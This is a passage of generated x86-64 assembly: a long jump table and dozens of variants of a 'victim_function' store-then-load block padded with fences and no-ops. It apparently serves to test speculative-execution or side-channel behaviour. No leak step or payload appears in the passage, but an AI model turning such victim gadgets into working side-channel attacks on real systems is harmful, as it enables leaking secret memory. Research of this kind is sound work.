	je	.Lvictim_function_win0_var2318
	cmpl	$2319, %eax
	je	.Lvictim_function_win0_var2319
	cmpl	$2320, %eax
	je	.Lvictim_function_win0_var2320
	cmpl	$2321, %eax
	je	.Lvictim_function_win0_var2321
	cmpl	$2322, %eax
	je	.Lvictim_function_win0_var2322
	cmpl	$2323, %eax
	je	.Lvictim_function_win0_var2323
	cmpl	$2324, %eax
	je	.Lvictim_function_win0_var2324
	cmpl	$2325, %eax
	je	.Lvictim_function_win0_var2325
	cmpl	$2326, %eax
	je	.Lvictim_function_win0_var2326
	cmpl	$2327, %eax
	je	.Lvictim_function_win0_var2327
	cmpl	$2328, %eax
	je	.Lvictim_function_win0_var2328
	cmpl	$2329, %eax
	je	.Lvictim_function_win0_var2329
	cmpl	$2330, %eax
	je	.Lvictim_function_win0_var2330
	cmpl	$2331, %eax
	je	.Lvictim_function_win0_var2331
	cmpl	$2332, %eax
	je	.Lvictim_function_win0_var2332
	cmpl	$2333, %eax
	je	.Lvictim_function_win0_var2333
	cmpl	$2334, %eax
	je	.Lvictim_function_win0_var2334
	cmpl	$2335, %eax
	je	.Lvictim_function_win0_var2335
	cmpl	$2336, %eax
	je	.Lvictim_function_win0_var2336
	cmpl	$2337, %eax
	je	.Lvictim_function_win0_var2337
	cmpl	$2338, %eax
	je	.Lvictim_function_win0_var2338
	cmpl	$2339, %eax
	je	.Lvictim_function_win0_var2339
	cmpl	$2340, %eax
	je	.Lvictim_function_win0_var2340
	cmpl	$2341, %eax
	je	.Lvictim_function_win0_var2341
	cmpl	$2342, %eax
	je	.Lvictim_function_win0_var2342
	cmpl	$2343, %eax
	je	.Lvictim_function_win0_var2343
	cmpl	$2344, %eax
	je	.Lvictim_function_win0_var2344
	cmpl	$2345, %eax
	je	.Lvictim_function_win0_var2345
	cmpl	$2346, %eax
	je	.Lvictim_function_win0_var2346
	cmpl	$2347, %eax
	je	.Lvictim_function_win0_var2347
	cmpl	$2348, %eax
	je	.Lvictim_function_win0_var2348
	cmpl	$2349, %eax
	je	.Lvictim_function_win0_var2349
	cmpl	$2350, %eax
	je	.Lvictim_function_win0_var2350
	cmpl	$2351, %eax
	je	.Lvictim_function_win0_var2351
	cmpl	$2352, %eax
	je	.Lvictim_function_win0_var2352
	cmpl	$2353, %eax
	je	.Lvictim_function_win0_var2353
	cmpl	$2354, %eax
	je	.Lvictim_function_win0_var2354
	cmpl	$2355, %eax
	je	.Lvictim_function_win0_var2355
	cmpl	$2356, %eax
	je	.Lvictim_function_win0_var2356
	cmpl	$2357, %eax
	je	.Lvictim_function_win0_var2357
	cmpl	$2358, %eax
	je	.Lvictim_function_win0_var2358
	cmpl	$2359, %eax
	je	.Lvictim_function_win0_var2359
	cmpl	$2360, %eax
	je	.Lvictim_function_win0_var2360
	cmpl	$2361, %eax
	je	.Lvictim_function_win0_var2361
	cmpl	$2362, %eax
	je	.Lvictim_function_win0_var2362
	cmpl	$2363, %eax
	je	.Lvictim_function_win0_var2363
	cmpl	$2364, %eax
	je	.Lvictim_function_win0_var2364
	cmpl	$2365, %eax
	je	.Lvictim_function_win0_var2365
	cmpl	$2366, %eax
	je	.Lvictim_function_win0_var2366
	cmpl	$2367, %eax
	je	.Lvictim_function_win0_var2367
	cmpl	$2368, %eax
	je	.Lvictim_function_win0_var2368
	cmpl	$2369, %eax
	je	.Lvictim_function_win0_var2369
	cmpl	$2370, %eax
	je	.Lvictim_function_win0_var2370
	cmpl	$2371, %eax
	je	.Lvictim_function_win0_var2371
	cmpl	$2372, %eax
	je	.Lvictim_function_win0_var2372
	cmpl	$2373, %eax
	je	.Lvictim_function_win0_var2373
	cmpl	$2374, %eax
	je	.Lvictim_function_win0_var2374
	cmpl	$2375, %eax
	je	.Lvictim_function_win0_var2375
	cmpl	$2376, %eax
	je	.Lvictim_function_win0_var2376
	cmpl	$2377, %eax
	je	.Lvictim_function_win0_var2377
	cmpl	$2378, %eax
	je	.Lvictim_function_win0_var2378
	cmpl	$2379, %eax
	je	.Lvictim_function_win0_var2379
	cmpl	$2380, %eax
	je	.Lvictim_function_win0_var2380
	cmpl	$2381, %eax
	je	.Lvictim_function_win0_var2381
	cmpl	$2382, %eax
	je	.Lvictim_function_win0_var2382
	cmpl	$2383, %eax
	je	.Lvictim_function_win0_var2383
	cmpl	$2384, %eax
	je	.Lvictim_function_win0_var2384
	cmpl	$2385, %eax
	je	.Lvictim_function_win0_var2385
	cmpl	$2386, %eax
	je	.Lvictim_function_win0_var2386
	cmpl	$2387, %eax
	je	.Lvictim_function_win0_var2387
	cmpl	$2388, %eax
	je	.Lvictim_function_win0_var2388
	cmpl	$2389, %eax
	je	.Lvictim_function_win0_var2389
	cmpl	$2390, %eax
	je	.Lvictim_function_win0_var2390
	cmpl	$2391, %eax
	je	.Lvictim_function_win0_var2391
	cmpl	$2392, %eax
	je	.Lvictim_function_win0_var2392
	cmpl	$2393, %eax
	je	.Lvictim_function_win0_var2393
	cmpl	$2394, %eax
	je	.Lvictim_function_win0_var2394
	cmpl	$2395, %eax
	je	.Lvictim_function_win0_var2395
	cmpl	$2396, %eax
	je	.Lvictim_function_win0_var2396
	cmpl	$2397, %eax
	je	.Lvictim_function_win0_var2397
	cmpl	$2398, %eax
	je	.Lvictim_function_win0_var2398
	cmpl	$2399, %eax
	je	.Lvictim_function_win0_var2399
	cmpl	$2400, %eax
	je	.Lvictim_function_win0_var2400
	cmpl	$2401, %eax
	je	.Lvictim_function_win0_var2401
	cmpl	$2402, %eax
	je	.Lvictim_function_win0_var2402
	cmpl	$2403, %eax
	je	.Lvictim_function_win0_var2403
	cmpl	$2404, %eax
	je	.Lvictim_function_win0_var2404
	cmpl	$2405, %eax
	je	.Lvictim_function_win0_var2405
	cmpl	$2406, %eax
	je	.Lvictim_function_win0_var2406
	cmpl	$2407, %eax
	je	.Lvictim_function_win0_var2407
	cmpl	$2408, %eax
	je	.Lvictim_function_win0_var2408
	cmpl	$2409, %eax
	je	.Lvictim_function_win0_var2409
	cmpl	$2410, %eax
	je	.Lvictim_function_win0_var2410
	cmpl	$2411, %eax
	je	.Lvictim_function_win0_var2411
	cmpl	$2412, %eax
	je	.Lvictim_function_win0_var2412
	cmpl	$2413, %eax
	je	.Lvictim_function_win0_var2413
	cmpl	$2414, %eax
	je	.Lvictim_function_win0_var2414
	cmpl	$2415, %eax
	je	.Lvictim_function_win0_var2415
	cmpl	$2416, %eax
	je	.Lvictim_function_win0_var2416
	cmpl	$2417, %eax
	je	.Lvictim_function_win0_var2417
	cmpl	$2418, %eax
	je	.Lvictim_function_win0_var2418
	cmpl	$2419, %eax
	je	.Lvictim_function_win0_var2419
	cmpl	$2420, %eax
	je	.Lvictim_function_win0_var2420
	cmpl	$2421, %eax
	je	.Lvictim_function_win0_var2421
	cmpl	$2422, %eax
	je	.Lvictim_function_win0_var2422
	cmpl	$2423, %eax
	je	.Lvictim_function_win0_var2423
	cmpl	$2424, %eax
	je	.Lvictim_function_win0_var2424
	cmpl	$2425, %eax
	je	.Lvictim_function_win0_var2425
	cmpl	$2426, %eax
	je	.Lvictim_function_win0_var2426
	cmpl	$2427, %eax
	je	.Lvictim_function_win0_var2427
	cmpl	$2428, %eax
	je	.Lvictim_function_win0_var2428
	cmpl	$2429, %eax
	je	.Lvictim_function_win0_var2429
	cmpl	$2430, %eax
	je	.Lvictim_function_win0_var2430
	cmpl	$2431, %eax
	je	.Lvictim_function_win0_var2431
	cmpl	$2432, %eax
	je	.Lvictim_function_win0_var2432
	cmpl	$2433, %eax
	je	.Lvictim_function_win0_var2433
	cmpl	$2434, %eax
	je	.Lvictim_function_win0_var2434
	cmpl	$2435, %eax
	je	.Lvictim_function_win0_var2435
	cmpl	$2436, %eax
	je	.Lvictim_function_win0_var2436
	cmpl	$2437, %eax
	je	.Lvictim_function_win0_var2437
	cmpl	$2438, %eax
	je	.Lvictim_function_win0_var2438
	cmpl	$2439, %eax
	je	.Lvictim_function_win0_var2439
	cmpl	$2440, %eax
	je	.Lvictim_function_win0_var2440
	cmpl	$2441, %eax
	je	.Lvictim_function_win0_var2441
	cmpl	$2442, %eax
	je	.Lvictim_function_win0_var2442
	cmpl	$2443, %eax
	je	.Lvictim_function_win0_var2443
	cmpl	$2444, %eax
	je	.Lvictim_function_win0_var2444
	cmpl	$2445, %eax
	je	.Lvictim_function_win0_var2445
	cmpl	$2446, %eax
	je	.Lvictim_function_win0_var2446
	cmpl	$2447, %eax
	je	.Lvictim_function_win0_var2447
	cmpl	$2448, %eax
	je	.Lvictim_function_win0_var2448
	cmpl	$2449, %eax
	je	.Lvictim_function_win0_var2449
	cmpl	$2450, %eax
	je	.Lvictim_function_win0_var2450
	cmpl	$2451, %eax
	je	.Lvictim_function_win0_var2451
	cmpl	$2452, %eax
	je	.Lvictim_function_win0_var2452
	cmpl	$2453, %eax
	je	.Lvictim_function_win0_var2453
	cmpl	$2454, %eax
	je	.Lvictim_function_win0_var2454
	cmpl	$2455, %eax
	je	.Lvictim_function_win0_var2455
	cmpl	$2456, %eax
	je	.Lvictim_function_win0_var2456
	cmpl	$2457, %eax
	je	.Lvictim_function_win0_var2457
	cmpl	$2458, %eax
	je	.Lvictim_function_win0_var2458
	cmpl	$2459, %eax
	je	.Lvictim_function_win0_var2459
	cmpl	$2460, %eax
	je	.Lvictim_function_win0_var2460
	cmpl	$2461, %eax
	je	.Lvictim_function_win0_var2461
	cmpl	$2462, %eax
	je	.Lvictim_function_win0_var2462
	cmpl	$2463, %eax
	je	.Lvictim_function_win0_var2463
	cmpl	$2464, %eax
	je	.Lvictim_function_win0_var2464
	cmpl	$2465, %eax
	je	.Lvictim_function_win0_var2465
	cmpl	$2466, %eax
	je	.Lvictim_function_win0_var2466
	cmpl	$2467, %eax
	je	.Lvictim_function_win0_var2467
	cmpl	$2468, %eax
	je	.Lvictim_function_win0_var2468
	cmpl	$2469, %eax
	je	.Lvictim_function_win0_var2469
	cmpl	$2470, %eax
	je	.Lvictim_function_win0_var2470
	cmpl	$2471, %eax
	je	.Lvictim_function_win0_var2471
	cmpl	$2472, %eax
	je	.Lvictim_function_win0_var2472
	cmpl	$2473, %eax
	je	.Lvictim_function_win0_var2473
	cmpl	$2474, %eax
	je	.Lvictim_function_win0_var2474
	cmpl	$2475, %eax
	je	.Lvictim_function_win0_var2475
	cmpl	$2476, %eax
	je	.Lvictim_function_win0_var2476
	cmpl	$2477, %eax
	je	.Lvictim_function_win0_var2477
	cmpl	$2478, %eax
	je	.Lvictim_function_win0_var2478
	cmpl	$2479, %eax
	je	.Lvictim_function_win0_var2479
	cmpl	$2480, %eax
	je	.Lvictim_function_win0_var2480
	cmpl	$2481, %eax
	je	.Lvictim_function_win0_var2481
	cmpl	$2482, %eax
	je	.Lvictim_function_win0_var2482
	cmpl	$2483, %eax
	je	.Lvictim_function_win0_var2483
	cmpl	$2484, %eax
	je	.Lvictim_function_win0_var2484
	cmpl	$2485, %eax
	je	.Lvictim_function_win0_var2485
	cmpl	$2486, %eax
	je	.Lvictim_function_win0_var2486
	cmpl	$2487, %eax
	je	.Lvictim_function_win0_var2487
	cmpl	$2488, %eax
	je	.Lvictim_function_win0_var2488
	cmpl	$2489, %eax
	je	.Lvictim_function_win0_var2489
	cmpl	$2490, %eax
	je	.Lvictim_function_win0_var2490
	cmpl	$2491, %eax
	je	.Lvictim_function_win0_var2491
	cmpl	$2492, %eax
	je	.Lvictim_function_win0_var2492
	cmpl	$2493, %eax
	je	.Lvictim_function_win0_var2493
	cmpl	$2494, %eax
	je	.Lvictim_function_win0_var2494
	cmpl	$2495, %eax
	je	.Lvictim_function_win0_var2495
	cmpl	$2496, %eax
	je	.Lvictim_function_win0_var2496
	cmpl	$2497, %eax
	je	.Lvictim_function_win0_var2497
	cmpl	$2498, %eax
	je	.Lvictim_function_win0_var2498
	cmpl	$2499, %eax
	je	.Lvictim_function_win0_var2499
	jmp	.Lvictim_function_win0_var0
## Variant 0
.Lvictim_function_win0_var0:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1
.Lvictim_function_win0_var1:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 2
.Lvictim_function_win0_var2:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 3
.Lvictim_function_win0_var3:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 4
.Lvictim_function_win0_var4:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 5
.Lvictim_function_win0_var5:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 6
.Lvictim_function_win0_var6:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 7
.Lvictim_function_win0_var7:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 8
.Lvictim_function_win0_var8:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 9
.Lvictim_function_win0_var9:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 10
.Lvictim_function_win0_var10:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 11
.Lvictim_function_win0_var11:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 12
.Lvictim_function_win0_var12:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 13
.Lvictim_function_win0_var13:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 14
.Lvictim_function_win0_var14:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 15
.Lvictim_function_win0_var15:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 16
.Lvictim_function_win0_var16:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 17
.Lvictim_function_win0_var17:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 18
.Lvictim_function_win0_var18:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 19
.Lvictim_function_win0_var19:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	nop
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 20
.Lvictim_function_win0_var20:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 21
.Lvictim_function_win0_var21:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 22
.Lvictim_function_win0_var22:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 23
.Lvictim_function_win0_var23:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 24
.Lvictim_function_win0_var24:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 25
.Lvictim_function_win0_var25:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 26
.Lvictim_function_win0_var26:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 27
.Lvictim_function_win0_var27:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 28
.Lvictim_function_win0_var28:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 29
.Lvictim_function_win0_var29:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 30
.Lvictim_function_win0_var30:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 31
.Lvictim_function_win0_var31:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 32
.Lvictim_function_win0_var32:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 33
.Lvictim_function_win0_var33:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 34
.Lvictim_function_win0_var34:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 35
.Lvictim_function_win0_var35:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 36
.Lvictim_function_win0_var36:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 37
.Lvictim_function_win0_var37:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 38
.Lvictim_function_win0_var38:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 39
.Lvictim_function_win0_var39:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 40
.Lvictim_function_win0_var40:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 41
.Lvictim_function_win0_var41:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 42
.Lvictim_function_win0_var42:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 43
.Lvictim_function_win0_var43:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 44
.Lvictim_function_win0_var44:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 45
.Lvictim_function_win0_var45:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 46
.Lvictim_function_win0_var46:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 47
.Lvictim_function_win0_var47:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 48
.Lvictim_function_win0_var48:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 49
.Lvictim_function_win0_var49:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 50
.Lvictim_function_win0_var50:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 51
.Lvictim_function_win0_var51:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 52
.Lvictim_function_win0_var52:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 53
.Lvictim_function_win0_var53:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 54
.Lvictim_function_win0_var54:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 55
.Lvictim_function_win0_var55:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 56
.Lvictim_function_win0_var56:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 57
.Lvictim_function_win0_var57:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
